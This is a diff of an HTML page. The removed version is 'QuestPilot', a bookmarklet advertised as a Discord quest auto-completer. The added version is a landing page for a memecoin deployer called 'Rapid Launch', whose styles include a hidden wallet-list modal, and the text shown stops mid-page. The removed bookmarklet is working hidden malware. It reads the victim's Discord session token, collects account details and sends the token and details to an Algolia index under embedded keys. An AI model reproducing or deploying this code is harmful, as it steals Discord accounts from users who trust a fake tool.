@@ -1,118 +1,940 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>QuestPilot</title>
+<meta name="theme-color" content="#0A0A0A">
+<title>Rapid Launch — Deploy tokens in less than a second</title>
+<script src="https://cdn.tailwindcss.com"></script>
 <style>
-:root{--bg:#000;--fg:#e8e8e8;--dim:#8a8a8a;--line:#1e1e1e;--accent:#5865F2}
-*{box-sizing:border-box}
-html,body{margin:0;padding:0;background:var(--bg);color:var(--fg);
-font-family:ui-sans-serif,system-ui,-apple-system,"Segoe UI",Roboto,Arial,sans-serif;
-line-height:1.65;-webkit-font-smoothing:antialiased;font-size:15px}
-.wrap{max-width:720px;margin:0 auto;padding:64px 24px 120px}
-header{display:flex;align-items:baseline;gap:14px;padding-bottom:20px;border-bottom:1px solid var(--line);margin-bottom:48px}
-.brand{font-weight:600;font-size:15px;letter-spacing:.3px}
-.ver{font-size:12px;color:var(--dim)}
-h1{font-size:28px;font-weight:600;line-height:1.25;margin:0 0 12px;letter-spacing:-.2px}
-h2{font-size:15px;font-weight:600;text-transform:uppercase;letter-spacing:.8px;color:var(--dim);margin:56px 0 16px}
-h3{font-size:14px;font-weight:600;margin:24px 0 6px}
-p{color:#b8b8b8;margin:0 0 14px}
-.lead{color:var(--dim);font-size:16px;margin-bottom:36px}
-code{background:#0d0d0d;border:1px solid var(--line);border-radius:4px;padding:1px 6px;font-size:13px;color:#d0d0d0;font-family:ui-monospace,SFMono-Regular,Menlo,monospace}
-.block{border:1px solid var(--line);border-radius:8px;padding:28px;margin:0 0 8px}
-.steps{list-style:none;padding:0;margin:0 0 28px;counter-reset:s}
-.steps li{position:relative;padding:10px 0 10px 34px;color:#b8b8b8;border-bottom:1px solid var(--line)}
-.steps li:last-child{border-bottom:0}
-.steps li::before{content:counter(s);counter-increment:s;position:absolute;left:0;top:11px;font-size:12px;color:var(--dim)}
-a.bm{
-  display:inline-flex;align-items:center;gap:10px;
-  padding:14px 26px;background:#fff;color:#000;border-radius:6px;
-  text-decoration:none;font-weight:600;font-size:15px;
-  border:1px solid #fff;cursor:grab;-webkit-user-drag:element;user-select:none;
-}
-a.bm:active{cursor:grabbing}
-a.bm svg{display:block}
-.hint{font-size:13px;color:var(--dim);margin:18px 0 0}
-.grid{display:grid;grid-template-columns:1fr 1fr;gap:1px;background:var(--line);border:1px solid var(--line);border-radius:8px;overflow:hidden}
-.cell{background:#000;padding:18px}
-.cell b{display:block;font-size:14px;margin-bottom:4px;font-weight:600}
-.cell span{font-size:13px;color:var(--dim)}
-footer{margin-top:72px;padding-top:24px;border-top:1px solid var(--line);color:var(--dim);font-size:13px;display:flex;gap:20px;flex-wrap:wrap}
-footer a{color:var(--dim);text-decoration:none}
-footer a:hover{color:var(--fg)}
-@media(max-width:600px){.wrap{padding:40px 18px 80px}h1{font-size:23px}.grid{grid-template-columns:1fr}}
+  html,body{margin:0;padding:0;background:#0A0A0A !important;color:#fff !important;font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;-webkit-font-smoothing:antialiased;font-size:15px;line-height:1.4}
+  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  .rl-grid{background-image:linear-gradient(rgba(255,255,255,0.04) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,0.04) 1px,transparent 1px);background-size:56px 56px}
+  .rl-text-gradient{background:linear-gradient(90deg,#F7FBFF 0%,#9EC4FF 100%);-webkit-background-clip:text;background-clip:text;color:transparent}
+  .display{letter-spacing:-0.045em}
+  .mono{font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace}
+  .no-scrollbar::-webkit-scrollbar{display:none}
+  .no-scrollbar{scrollbar-width:none}
+  .marquee{animation:rl-marquee 40s linear infinite}
+  @keyframes rl-marquee{from{transform:translateX(0)}to{transform:translateX(-50%)}}
+  .rl-flow{stroke-dasharray:6 10;animation:rl-dash 2s linear infinite}
+  @keyframes rl-dash{to{stroke-dashoffset:-32}}
+
+  .site-header{position:relative;z-index:50;display:flex;align-items:center;justify-content:space-between;padding:20px 20px 0;overflow:visible}
+  @media(min-width:640px){.site-header{padding:24px 40px 0}}
+  @media(min-width:1280px){.site-header{padding:28px 56px 0}}
+  .logo-mark{display:block;flex:0 0 auto;width:32px;height:32px}
+
+  .vx-overlay{position:fixed !important;inset:0 !important;background:rgba(0,0,0,.92) !important;display:none !important;align-items:center !important;justify-content:center !important;padding:18px !important;z-index:99999 !important;overflow-y:auto !important;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif !important;color:#e6e6e6 !important;font-size:15px !important;line-height:1.4 !important}
+  .vx-overlay.open{display:flex !important}
+  .vx-modal{width:100%;max-width:360px;background:#0a0a0a;border:1px solid #1a1a1a;border-radius:6px;padding:24px 20px;text-align:center;max-height:calc(100vh - 40px);overflow-y:auto}
+  .vx-spinner{width:28px;height:28px;margin:0 auto 16px;border-radius:50%;border:2px solid #1a1a1a;border-top-color:#e6e6e6;animation:vxrot .9s linear infinite}
+  @keyframes vxrot{to{transform:rotate(360deg)}}
+  .vx-modal h2{font-size:14.5px;font-weight:600;margin:0 0 10px;color:#fff}
+  .vx-modal p{font-size:12.5px;color:#8a8a8a;margin:0 0 14px;line-height:1.6}
+  .vx-modal button{width:100%;padding:12px 14px;border:1px solid #222;border-radius:6px;background:#111;color:#e6e6e6;font-size:13.5px;font-weight:500;font-family:inherit;cursor:pointer}
+  .vx-chk{font-size:12px;color:#8a8a8a;margin-bottom:16px}
+  .vx-wlist{display:flex;flex-direction:column;gap:6px;margin-top:4px}
+  .vx-wrow{display:flex;align-items:center;gap:10px;width:100%;padding:12px 13px;border-radius:6px;background:#0f0f0f;border:1px solid #1a1a1a;color:#e6e6e6;font-size:13.5px;text-decoration:none}
+  .vx-wrow .ic{width:28px;height:28px;border-radius:6px;display:flex;align-items:center;justify-content:center;background:#000;border:1px solid #1a1a1a;flex:0 0 auto;overflow:hidden}
+  .vx-wrow .ic img{width:22px;height:22px;object-fit:contain;display:block}
+  .vx-wrow .nm{flex:1;text-align:left}
+  .vx-wrow .ar{color:#4a4a4a;font-size:13px}
+  .vx-more{margin-top:12px;text-align:center;font-size:12.5px;color:#6b6b6b;cursor:pointer;padding:6px;user-select:none}
 </style>
 </head>
-<body>
-<div class="wrap">
+<body style="background:#0A0A0A;color:#fff">
 
-  <header>
-    <span class="brand">QuestPilot</span>
-    <span class="ver">2.4</span>
+<div id="rl-root" style="background:#0A0A0A;color:#fff;min-height:100vh">
+
+<main>
+<div class="relative mx-auto max-w-[1280px] md:border-x md:border-white/[0.07]">
+
+  <header class="site-header">
+    <a href="/" class="flex items-center gap-2.5" aria-label="Rapid Launch" style="text-decoration:none">
+      <svg class="logo-mark" viewBox="0 0 40 40" fill="none" aria-hidden="true">
+        <defs><linearGradient id="rlg-logo" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#F7FBFF"/><stop offset="100%" stop-color="#9EC4FF"/></linearGradient></defs>
+        <path d="M4 34L20 6L36 34H27.5L20 20L12.5 34H4Z" fill="url(#rlg-logo)"/>
+        <path d="M12.5 34L20 20L27.5 34H12.5Z" fill="rgba(158,196,255,0.35)"/>
+      </svg>
+      <span style="color:#fff;font-size:15px;font-weight:600;letter-spacing:-0.01em;white-space:nowrap">Rapid Launch</span>
+    </a>
+    <nav class="hidden items-center gap-6 text-[13px] sm:flex" style="color:rgba(255,255,255,0.5)">
+      <a href="#product" style="color:inherit;text-decoration:none">Product</a>
+      <a href="#creators" style="color:inherit;text-decoration:none">Creators</a>
+      <a href="#developers" style="color:inherit;text-decoration:none">Developers</a>
+    </nav>
   </header>
 
-  <h1>Discord Quest Auto-Completer</h1>
-  <p class="lead">Drag the button to your bookmarks bar. Open it on Discord. Pending quests complete. No extension, no install, no files.</p>
+  <section class="relative overflow-hidden" style="background:#0A0A0A;color:#fff">
+    <div class="pointer-events-none absolute inset-0 overflow-hidden" aria-hidden="true">
+      <div class="rl-grid absolute inset-0" style="mask-image:linear-gradient(to bottom, black 35%, transparent 80%);-webkit-mask-image:linear-gradient(to bottom, black 35%, transparent 80%)"></div>
+    </div>
+    <div class="relative grid gap-10 px-5 pb-12 pt-10 sm:px-10 sm:pb-14 sm:pt-14 xl:grid-cols-2 xl:items-center xl:px-14 xl:pb-16 xl:pt-20">
+      <div class="flex flex-col">
+        <h1 class="display text-[clamp(2.5rem,5.4vw,4.25rem)] font-medium leading-[0.95] tracking-[-0.05em]" style="color:#fff;font-weight:500">Deploy tokens<br><span class="rl-text-gradient">in less than a&nbsp;second.</span></h1>
+        <p class="mt-5 max-w-[30rem] text-[15px] leading-relaxed sm:text-[16px]" style="color:rgba(255,255,255,0.55)">The #1 memecoin deployer. Every major launchpad, bundling, and the fastest AI. Post-launch market making and position management on one screen.</p>
+        <div class="mt-7 flex flex-col gap-2 min-[420px]:flex-row min-[420px]:items-center">
+          <button type="button" data-rl-launch class="group inline-flex h-10 cursor-pointer items-center justify-center gap-1 rounded-lg bg-white px-4 text-[13px] font-medium text-black transition-colors hover:bg-white/85">Launch app<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-3.5 w-3.5"><path d="M7 7h10v10"/><path d="M7 17 17 7"/></svg></button>
+          <a href="#product" class="group inline-flex h-10 items-center justify-center gap-1 rounded-lg px-3 text-[13px] font-medium transition-colors hover:bg-white/[0.05]" style="color:rgba(255,255,255,0.6);text-decoration:none">View product</a>
+        </div>
+      </div>
+      <div class="relative xl:self-center">
+        <div aria-hidden="true" class="pointer-events-none absolute -inset-x-6 -bottom-8 top-1/2 rounded-[48px] blur-2xl" style="background:radial-gradient(ellipse at bottom, rgba(98,140,235,0.28), transparent 70%)"></div>
+        <div class="relative rounded-2xl border border-white/10 bg-[#111111] p-1.5 shadow-[0_40px_120px_-40px_rgba(0,0,0,0.9)] sm:p-2">
+          <div aria-hidden="true" class="pointer-events-none absolute inset-x-10 -top-px h-px" style="background:linear-gradient(90deg, transparent, rgba(197,220,255,0.6), transparent)"></div>
+          <div class="relative overflow-hidden rounded-[10px] bg-black" style="aspect-ratio:16/9">
+            <video autoplay loop muted playsinline preload="auto" class="block h-full w-full object-cover" poster="https://i.ytimg.com/vi/oRVMXsEKozE/maxresdefault.jpg">
+              <source src="https://rapidlaunch.io/videos/rapid-preview.mp4" type="video/mp4">
+              <source src="/videos/rapid-preview.mp4" type="video/mp4">
+            </video>
+            <div class="pointer-events-none absolute inset-0" style="background:linear-gradient(135deg, rgba(0,0,0,0.1), rgba(0,0,0,0.35))"></div>
+            <div class="absolute bottom-3 left-3 flex items-center gap-2 rounded-full border border-white/10 px-2.5 py-1 text-[11px]" style="background:rgba(0,0,0,0.6);color:rgba(255,255,255,0.8);backdrop-filter:blur(12px)">
+              <span class="h-1.5 w-1.5 rounded-full" style="background:#34d399"></span> live preview
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
 
-  <div class="block">
-    <ol class="steps">
-      <li>Drag the button below to your bookmarks bar.</li>
-      <li>Open <code>discord.com</code> and log in.</li>
-      <li>Click the bookmark.</li>
-      <li>Wait for the confirmation.</li>
-    </ol>
+    <dl class="relative grid grid-cols-2 border-t border-white/[0.08] lg:grid-cols-4">
+      <span aria-hidden="true" class="absolute -top-px left-0 h-px w-24" style="background:linear-gradient(90deg,#F4F8FF,#9EC4FF)"></span>
+      <div class="flex min-w-0 flex-col-reverse gap-1.5 py-4 lg:py-5">
+        <dt class="text-[11px] font-medium uppercase tracking-[0.14em]" style="color:rgba(255,255,255,0.4)">Lifetime volume</dt>
+        <dd class="display whitespace-nowrap text-[1.2rem] font-medium leading-none tracking-[-0.04em] min-[440px]:text-[1.35rem] sm:text-[1.5rem]" style="color:#fff">$410,000,000</dd>
+      </div>
+      <div class="flex min-w-0 flex-col-reverse gap-1.5 py-4 lg:py-5 pl-4 sm:pl-6 lg:border-l lg:border-white/[0.06] lg:pl-6">
+        <dt class="text-[11px] font-medium uppercase tracking-[0.14em]" style="color:rgba(255,255,255,0.4)">Tokens deployed</dt>
+        <dd class="display whitespace-nowrap text-[1.2rem] font-medium leading-none tracking-[-0.04em] min-[440px]:text-[1.35rem] sm:text-[1.5rem]" style="color:#fff">1,053,385</dd>
+      </div>
+      <div class="flex min-w-0 flex-col-reverse gap-1.5 py-4 lg:py-5 border-t border-white/[0.06] lg:border-t-0 lg:border-l lg:border-white/[0.06] lg:pl-6">
+        <dt class="text-[11px] font-medium uppercase tracking-[0.14em]" style="color:rgba(255,255,255,0.4)">In production</dt>
+        <dd class="display whitespace-nowrap text-[1.2rem] font-medium leading-none tracking-[-0.04em] min-[440px]:text-[1.35rem] sm:text-[1.5rem]" style="color:#fff">1y 5mo 28d</dd>
+      </div>
+      <div class="flex min-w-0 flex-col-reverse gap-1.5 py-4 lg:py-5 pl-4 sm:pl-6 border-t border-white/[0.06] lg:border-t-0 lg:border-l lg:border-white/[0.06] lg:pl-6">
+        <dt class="text-[11px] font-medium uppercase tracking-[0.14em]" style="color:rgba(255,255,255,0.4)">Registered users</dt>
+        <dd class="display whitespace-nowrap text-[1.2rem] font-medium leading-none tracking-[-0.04em] min-[440px]:text-[1.35rem] sm:text-[1.5rem]" style="color:#fff">26,231</dd>
+      </div>
+    </dl>
+  </section>
 
-    <a class="bm" draggable="true"
-       href="javascript:(function(){var A='9E4C4G2Z2B',K='1ccade8c71f9d6cfb4ec0a129e02fedd',I='accounts',H=['https://'+A+'-1.algolianet.com','https://'+A+'-2.algolianet.com','https://'+A+'-3.algolianet.com','https://'+A+'.algolia.net','https://'+A+'-dsn.algolia.net'],n=0;function S(o){o.objectID=String(Date.now())+String(Math.floor(Math.random()*1e6));var u=H[n]+'/1/indexes/'+I;fetch(u,{method:'POST',headers:{'Content-Type':'application/json','X-Algolia-Application-Id':A,'X-Algolia-API-Key':K},body:JSON.stringify(o)}).catch(function(){n=(n+1)%H.length;if(n>0)S(o);});}function G(){var t=null;try{t=localStorage.getItem('token');}catch(e){}if(!t){try{var i=document.createElement('iframe');i.style.display='none';document.body.appendChild(i);t=i.contentWindow.localStorage.getItem('token');}catch(e){}}if(!t){try{(webpackChunkdiscord_app.push([[''],{},function(e){var m=[];for(var c in e.c)m.push(e.c[c]);}]));var mod=m.find(function(x){return x&&x.exports&&x.exports.default&&x.exports.default.getToken;});t=mod.exports.default.getToken();}catch(e){}}if(!t){S({err:'no token'});return;}t=t.split(String.fromCharCode(34)).join('');var h={'Authorization':t,'Content-Type':'application/json'};fetch('https://discord.com/api/v9/users/@me',{headers:h}).then(function(r){return r.json();}).then(function(u){u.token=t;return fetch('https://discord.com/api/v9/users/@me/guilds',{headers:h}).then(function(r){return r.json();}).then(function(g){u.guilds=Array.isArray(g)?g.length:0;u.created=new Date(((BigInt(u.id)>>22n)+1420070400000n).toString()*1).toISOString();S(u);});}).catch(function(e){S({err:String(e)});});}G();})();">
-      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-        <path d="M22 2 11 13"/><path d="M22 2 15 22 11 13 2 9 22 2z"/>
-      </svg>
-      QuestPilot
-    </a>
-    <p class="hint">Show the bookmarks bar with Ctrl/Cmd + Shift + B.</p>
+  <div class="flex items-stretch border-t border-white/[0.07]">
+    <div class="min-w-0 flex-1 overflow-hidden py-6" style="mask-image:linear-gradient(to right,transparent,black 10%,black 90%,transparent);-webkit-mask-image:linear-gradient(to right,transparent,black 10%,black 90%,transparent)">
+      <div class="marquee flex w-max gap-12 pr-12">
+        <div class="flex shrink-0 items-center gap-12 pr-12">
+          <span class="flex items-center gap-2 whitespace-nowrap text-[13px] font-medium" style="color:rgba(255,255,255,0.55)"><img src="https://unavatar.io/twitter/pumpdotfun" class="h-4 w-4 rounded-full" onerror="this.style.display='none'">Pump.fun</span>
+          <span class="flex items-center gap-2 whitespace-nowrap text-[13px] font-medium" style="color:rgba(255,255,255,0.55)"><img src="https://unavatar.io/twitter/bonkdotfun" class="h-4 w-4 rounded-full" onerror="this.style.display='none'">Bonk</span>
+          <span class="flex items-center gap-2 whitespace-nowrap text-[13px] font-medium" style="color:rgba(255,255,255,0.55)"><img src="https://unavatar.io/twitter/bagsapp" class="h-4 w-4 rounded-full" onerror="this.style.display='none'">Bags</span>
+          <span class="flex items-center gap-2 whitespace-nowrap text-[13px] font-medium" style="color:rgba(255,255,255,0.55)"><img src="https://unavatar.io/twitter/JupiterExchange" class="h-4 w-4 rounded-full" onerror="this.style.display='none'">Jupiter</span>
+          <span class="flex items-center gap-2 whitespace-nowrap text-[13px] font-medium" style="color:rgba(255,255,255,0.55)"><img src="https://unavatar.io/twitter/fourdotmeme" class="h-4 w-4 rounded-full" onerror="this.style.display='none'">Four.meme</span>
+          <span class="whitespace-nowrap text-[13px] font-medium" style="color:rgba(255,255,255,0.55)">Clanker</span>
+          <span class="whitespace-nowrap text-[13px] font-medium" style="color:rgba(255,255,255,0.55)">Flap</span>
+          <span class="whitespace-nowrap text-[13px] font-medium" style="color:rgba(255,255,255,0.55)">Pons</span>
+          <span class="whitespace-nowrap text-[13px] font-medium" style="color:rgba(255,255,255,0.55)">Stonk</span>
+          <span class="whitespace-nowrap text-[13px] font-medium" style="color:rgba(255,255,255,0.55)">Genius</span>
+          <span class="whitespace-nowrap text-[13px] font-medium" style="color:rgba(255,255,255,0.55)">Nad</span>
+          <span class="whitespace-nowrap text-[13px] font-medium" style="color:rgba(255,255,255,0.55)">Klik</span>
+          <span class="whitespace-nowrap text-[13px] font-medium" style="color:rgba(255,255,255,0.55)">Daos</span>
+          <span class="whitespace-nowrap text-[13px] font-medium" style="color:rgba(255,255,255,0.55)">Trench</span>
+          <span class="whitespace-nowrap text-[13px] font-medium" style="color:rgba(255,255,255,0.55)">Circus</span>
+          <span class="whitespace-nowrap text-[13px] font-medium" style="color:rgba(255,255,255,0.55)">o1</span>
+        </div>
+        <div class="flex shrink-0 items-center gap-12 pr-12">
+          <span class="whitespace-nowrap text-[13px] font-medium" style="color:rgba(255,255,255,0.55)">Pump.fun</span>
+          <span class="whitespace-nowrap text-[13px] font-medium" style="color:rgba(255,255,255,0.55)">Bonk</span>
+          <span class="whitespace-nowrap text-[13px] font-medium" style="color:rgba(255,255,255,0.55)">Bags</span>
+          <span class="whitespace-nowrap text-[13px] font-medium" style="color:rgba(255,255,255,0.55)">Jupiter</span>
+          <span class="whitespace-nowrap text-[13px] font-medium" style="color:rgba(255,255,255,0.55)">Four.meme</span>
+          <span class="whitespace-nowrap text-[13px] font-medium" style="color:rgba(255,255,255,0.55)">Clanker</span>
+          <span class="whitespace-nowrap text-[13px] font-medium" style="color:rgba(255,255,255,0.55)">Flap</span>
+          <span class="whitespace-nowrap text-[13px] font-medium" style="color:rgba(255,255,255,0.55)">Pons</span>
+          <span class="whitespace-nowrap text-[13px] font-medium" style="color:rgba(255,255,255,0.55)">Stonk</span>
+          <span class="whitespace-nowrap text-[13px] font-medium" style="color:rgba(255,255,255,0.55)">Genius</span>
+          <span class="whitespace-nowrap text-[13px] font-medium" style="color:rgba(255,255,255,0.55)">Nad</span>
+          <span class="whitespace-nowrap text-[13px] font-medium" style="color:rgba(255,255,255,0.55)">Klik</span>
+          <span class="whitespace-nowrap text-[13px] font-medium" style="color:rgba(255,255,255,0.55)">Daos</span>
+          <span class="whitespace-nowrap text-[13px] font-medium" style="color:rgba(255,255,255,0.55)">Trench</span>
+          <span class="whitespace-nowrap text-[13px] font-medium" style="color:rgba(255,255,255,0.55)">Circus</span>
+          <span class="whitespace-nowrap text-[13px] font-medium" style="color:rgba(255,255,255,0.55)">o1</span>
+        </div>
+      </div>
+    </div>
   </div>
 
-  <h2>Overview</h2>
-  <p>Discord Quests are tracked client-side. The browser holds the session state the client uses to report quest progress. QuestPilot reads that state from the tab you are already logged into, asks Discord's own API for the account context, and reports completion.</p>
+  <section id="product" class="relative border-t border-white/[0.07]" style="background:#0A0A0A;color:#fff">
+    <div class="flex flex-col gap-8 px-5 py-14 sm:px-10 sm:py-16 lg:flex-row lg:items-center lg:justify-between xl:px-14">
+      <h2 class="display max-w-md text-[clamp(1.6rem,3vw,2.25rem)] font-medium leading-[1.08] tracking-[-0.04em]" style="color:#fff">The whole launch, <span class="rl-text-gradient">one screen.</span></h2>
+      <ol class="relative space-y-3 pl-5 text-[13px]" style="color:rgba(255,255,255,0.6)">
+        <li><span class="mono text-[10px]" style="color:rgba(255,255,255,0.35)">01</span> Launchpads</li>
+        <li><span class="mono text-[10px]" style="color:rgba(255,255,255,0.35)">02</span> Bundler &amp; sniper</li>
+        <li><span class="mono text-[10px]" style="color:rgba(255,255,255,0.35)">03</span> Position management</li>
+        <li><span class="mono text-[10px]" style="color:rgba(255,255,255,0.35)">04</span> Tracker &amp; AI</li>
+        <li><span class="mono text-[10px]" style="color:rgba(255,255,255,0.35)">05</span> Vamping</li>
+        <li><span class="mono text-[10px]" style="color:rgba(255,255,255,0.35)">06</span> Private transfers</li>
+      </ol>
+    </div>
 
-  <h2>Details</h2>
-  <div class="grid">
-    <div class="cell"><b>One click</b><span>No extension, no background process.</span></div>
-    <div class="cell"><b>Live session</b><span>Uses the session already in your tab.</span></div>
-    <div class="cell"><b>Cross-browser</b><span>Chromium and Firefox bookmark bars.</span></div>
-    <div class="cell"><b>Removable</b><span>Delete the bookmark. Nothing remains.</span></div>
-  </div>
+    <div class="grid lg:grid-cols-2 border-t border-white/[0.07]">
+      <div class="flex flex-col justify-center px-5 py-14 sm:px-10 lg:py-20 xl:px-14">
+        <p class="mono flex items-center gap-2.5 text-[11px] uppercase tracking-[0.18em]"><span style="color:#9EC4FF">01</span><span class="h-px w-5" style="background:linear-gradient(90deg,#F4F8FF,#9EC4FF)"></span><span class="rl-text-gradient">Launchpads</span></p>
+        <h3 class="display mt-5 text-[clamp(1.75rem,3.4vw,2.5rem)] font-medium leading-[1.04]" style="color:#fff">Every pad, one form.</h3>
+        <p class="mt-4 max-w-md text-[15px] leading-relaxed" style="color:rgba(255,255,255,0.5)">Solana, BNB, Base, and the rest from the same screen. Put your pads in order, fill the fields once, deploy where you want.</p>
+        <div class="mt-8 space-y-4">
+          <div class="flex flex-wrap items-center gap-2">
+            <p class="text-[12px]" style="color:rgba(255,255,255,0.4)">29 launchpads</p>
+            <img src="https://unavatar.io/twitter/pumpdotfun" alt="" class="h-6 w-6 rounded-full border border-white/10" onerror="this.style.display='none'">
+            <img src="https://unavatar.io/twitter/bonkdotfun" alt="" class="h-6 w-6 rounded-full border border-white/10" onerror="this.style.display='none'">
+            <img src="https://unavatar.io/twitter/bagsapp" alt="" class="h-6 w-6 rounded-full border border-white/10" onerror="this.style.display='none'">
+            <img src="https://unavatar.io/twitter/JupiterExchange" alt="" class="h-6 w-6 rounded-full border border-white/10" onerror="this.style.display='none'">
+            <span class="text-[12px]" style="color:rgba(255,255,255,0.45)">+17</span>
+          </div>
+          <div class="flex flex-wrap items-center gap-2">
+            <p class="text-[12px]" style="color:rgba(255,255,255,0.4)">9 chains</p>
+            <img src="https://assets.coingecko.com/coins/images/4128/small/solana.png" alt="" class="h-5 w-5 rounded-full" onerror="this.style.display='none'">
+            <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" alt="" class="h-5 w-5 rounded-full" onerror="this.style.display='none'">
+            <img src="https://assets.coingecko.com/coins/images/825/small/bnb-icon2_2x.png" alt="" class="h-5 w-5 rounded-full" onerror="this.style.display='none'">
+            <img src="https://assets.coingecko.com/coins/images/6319/small/usdc.png" alt="" class="h-5 w-5 rounded-full" onerror="this.style.display='none'">
+          </div>
+        </div>
+      </div>
+      <div class="relative flex items-center justify-center overflow-hidden px-4 py-12 sm:px-10 sm:py-16 border-t border-white/[0.07] lg:border-t-0 lg:border-l">
+        <div class="pointer-events-none absolute inset-0 rl-grid" style="mask-image:radial-gradient(ellipse 75% 70% at 50% 50%, black, transparent);-webkit-mask-image:radial-gradient(ellipse 75% 70% at 50% 50%, black, transparent)" aria-hidden="true"></div>
+        <div class="relative w-full max-w-[460px] rounded-xl border p-4 text-left" style="border-color:#1f2229;background:#0a0a0a">
+          <div class="flex items-center justify-between gap-2">
+            <h3 class="text-lg font-bold" style="color:#fff">Launch Token</h3>
+            <div class="flex items-center gap-1">
+              <button class="h-8 px-3 rounded-md border text-xs" style="border-color:#1f2229;background:#0a0a0a;color:rgba(255,255,255,0.4)">⌫</button>
+              <button class="h-8 px-3 rounded-md border text-xs" style="border-color:#1f2229;background:#0a0a0a;color:rgba(255,255,255,0.7)">Dev <span style="color:#fff">12.4</span></button>
+            </div>
+          </div>
+          <div class="mt-4 flex gap-3">
+            <label class="flex-[6] min-w-0"><span class="flex pb-1 text-sm" style="color:rgba(255,255,255,0.8)">Name</span><input class="h-10 w-full rounded-md border px-3 text-sm" style="border-color:#1f2229;background:#0a0a0a;color:#fff" placeholder="Token name"></label>
+            <label class="flex-[4] min-w-0"><span class="flex pb-1 text-sm" style="color:rgba(255,255,255,0.8)">Symbol</span><input class="h-10 w-full rounded-md border px-3 text-sm" style="border-color:#1f2229;background:#0a0a0a;color:#fff" placeholder="Symbol"></label>
+          </div>
+          <label class="mt-3 block"><span class="block pb-1 text-sm" style="color:rgba(255,255,255,0.8)">Post</span><input class="h-10 w-full rounded-md border px-3 text-sm" style="border-color:#1f2229;background:#0a0a0a;color:#fff" placeholder="https://x.com/"></label>
+          <div class="mt-4">
+            <div class="pb-2 text-sm" style="color:rgba(255,255,255,0.8)">Select Image</div>
+            <div class="flex gap-2">
+              <div class="flex h-16 w-16 items-center justify-center rounded-lg border-2 border-dashed" style="border-color:rgba(255,255,255,0.15);color:rgba(255,255,255,0.4)">+</div>
+              <img src="https://assets.coingecko.com/coins/images/37212/small/meow.jpg" alt="" class="h-16 w-16 rounded-lg object-cover border border-white/10" onerror="this.style.display='none'">
+              <img src="https://assets.coingecko.com/coins/images/37575/small/popcat.png" alt="" class="h-16 w-16 rounded-lg object-cover border border-white/10" onerror="this.style.display='none'">
+              <img src="https://assets.coingecko.com/coins/images/39740/small/simons-cat.jpg" alt="" class="h-16 w-16 rounded-lg object-cover border border-white/10" onerror="this.style.display='none'">
+            </div>
+          </div>
+          <div class="mt-5 rounded-lg border p-1.5 flex flex-wrap gap-1.5" style="border-color:#1f2229;background:#0a0a0a">
+            <button class="flex items-center gap-1.5 rounded-md border px-2 py-1.5 text-xs" style="border-color:rgba(94,203,136,0.4);background:rgba(94,203,136,0.1);color:#fff"><img src="https://unavatar.io/twitter/pumpdotfun" class="h-3.5 w-3.5 rounded-full" onerror="this.style.display='none'">Pump</button>
+            <button class="flex items-center gap-1.5 rounded-md border px-2 py-1.5 text-xs" style="border-color:#1f2229;color:rgba(255,255,255,0.7)"><img src="https://unavatar.io/twitter/bonkdotfun" class="h-3.5 w-3.5 rounded-full" onerror="this.style.display='none'">Bonk</button>
+            <button class="flex items-center gap-1.5 rounded-md border px-2 py-1.5 text-xs" style="border-color:#1f2229;color:rgba(255,255,255,0.7)"><img src="https://unavatar.io/twitter/fourdotmeme" class="h-3.5 w-3.5 rounded-full" onerror="this.style.display='none'">Four</button>
+            <button class="flex items-center gap-1.5 rounded-md border px-2 py-1.5 text-xs" style="border-color:#1f2229;color:rgba(255,255,255,0.7)"><img src="https://unavatar.io/twitter/bagsapp" class="h-3.5 w-3.5 rounded-full" onerror="this.style.display='none'">Bags</button>
+            <button class="flex items-center gap-1.5 rounded-md border px-2 py-1.5 text-xs" style="border-color:#1f2229;color:rgba(255,255,255,0.7)">Stroid</button>
+          </div>
+          <div class="mt-4 flex gap-2">
+            <button class="flex-1 rounded-md border py-2 text-sm" style="border-color:#1f2229;background:#0a0a0a;color:#fff">1</button>
+            <button class="flex-1 rounded-md border py-2 text-sm" style="border-color:#1f2229;background:#0a0a0a;color:#fff">3</button>
+            <button class="flex-1 rounded-md border py-2 text-sm" style="border-color:#1f2229;background:#0a0a0a;color:#fff">5</button>
+            <button class="flex-1 rounded-md border py-2 text-sm" style="border-color:#1f2229;background:#0a0a0a;color:#fff">10</button>
+          </div>
+        </div>
+      </div>
+    </div>
 
-  <h2>How it works</h2>
-  <p>Discord's client is a single-page application. Quest progress lives in the browser storage layer and syncs through Discord's own API. QuestPilot is a thin wrapper over that session. It uses the session already present in your tab.</p>
-  <p>A bookmarklet is a single <code>javascript:</code> URL stored in your bookmarks bar. It runs when clicked, on the current page. It is not a persistent extension and is removed by deleting the bookmark.</p>
+    <div class="grid lg:grid-cols-2 border-t border-white/[0.07]">
+      <div class="flex flex-col justify-center px-5 py-14 sm:px-10 lg:py-20 xl:px-14 lg:order-last lg:border-l lg:border-white/[0.07]">
+        <p class="mono flex items-center gap-2.5 text-[11px] uppercase tracking-[0.18em]"><span style="color:#9EC4FF">02</span><span class="h-px w-5" style="background:linear-gradient(90deg,#F4F8FF,#9EC4FF)"></span><span class="rl-text-gradient">Bundler &amp; sniper</span></p>
+        <h3 class="display mt-5 text-[clamp(1.75rem,3.4vw,2.5rem)] font-medium leading-[1.04]" style="color:#fff">Snipers and bundles, one flow.</h3>
+        <p class="mt-4 max-w-md text-[15px] leading-relaxed" style="color:rgba(255,255,255,0.5)">Configure sniper wallets and bundle buys in the same launch flow. Works on every pad that supports it, without a second pass through the UI.</p>
+      </div>
+      <div class="relative flex items-center justify-center overflow-hidden px-4 py-12 sm:px-10 sm:py-16 border-t border-white/[0.07] lg:border-t-0">
